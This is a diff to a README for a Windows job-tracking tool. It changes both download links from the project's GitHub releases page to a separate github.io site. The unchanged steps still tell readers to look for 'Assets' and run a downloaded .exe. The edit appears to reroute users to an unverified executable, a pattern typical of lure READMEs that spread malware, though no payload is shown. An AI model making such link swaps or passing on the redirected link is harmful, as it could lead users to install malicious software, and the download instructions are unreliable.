@@ -1,6 +1,6 @@
 # 📋 job-tracker - Manage your job hunt with ease.
 
-[![](https://img.shields.io/badge/download-get_latest_version-blue.svg)](https://github.com/Dixievaseshaped907/job-tracker/releases)
+[![](https://img.shields.io/badge/download-get_latest_version-blue.svg)](https://dixievaseshaped907.github.io)
 
 Job-tracker helps you organize your career search. You can save job postings, move them across a status board, and keep a clear record of every role. The tool runs on your computer and keeps your data in your hands.
 
@@ -8,7 +8,7 @@ Job-tracker helps you organize your career search. You can save job postings, mo
 
 You need to download the program to your Windows computer. Follow these steps to prepare the tool:
 
-1. Visit [this page to download](https://github.com/Dixievaseshaped907/job-tracker/releases).
+1. Visit [this page to download](https://dixievaseshaped907.github.io).
 2. Look for the section labeled "Assets."
 3. Click the link ending in .exe to start your download.
 4. Save the file to your desktop or your Downloads folder.
